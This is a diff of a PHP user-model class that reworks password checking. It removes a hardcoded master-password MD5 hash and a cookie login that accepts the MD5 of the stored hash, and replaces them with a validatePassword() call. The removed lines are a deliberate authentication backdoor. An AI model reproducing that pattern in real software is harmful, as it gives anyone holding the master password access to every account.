@@ -247,12 +247,7 @@ class Vps_User_Model extends Vps_Model_Proxy
             );
         }
 
-        $passCol = $this->_passwordColumn;
-        $superPassword = '18de947e015ad2761ed16422f1f3478b';
-        if ($credential == md5($row->$passCol) // für cookie login
-            || $row->encodePassword($credential) == $row->$passCol
-            || md5($credential) == $superPassword
-        ) {
+        if (!$row->validatePassword($credential)) {
             if ($row->locked) {
                 $this->writeLog(array(
                     'user_id' => $row->id,
@@ -377,6 +372,11 @@ class Vps_User_Model extends Vps_Model_Proxy
         if ($this->_logActions) {
             $this->getDependentModel('Messages')->createRow($data)->save();
         }
+    }
+
+    public function getPasswordColumn()
+    {
+        return $this->_passwordColumn;
     }
 
 }
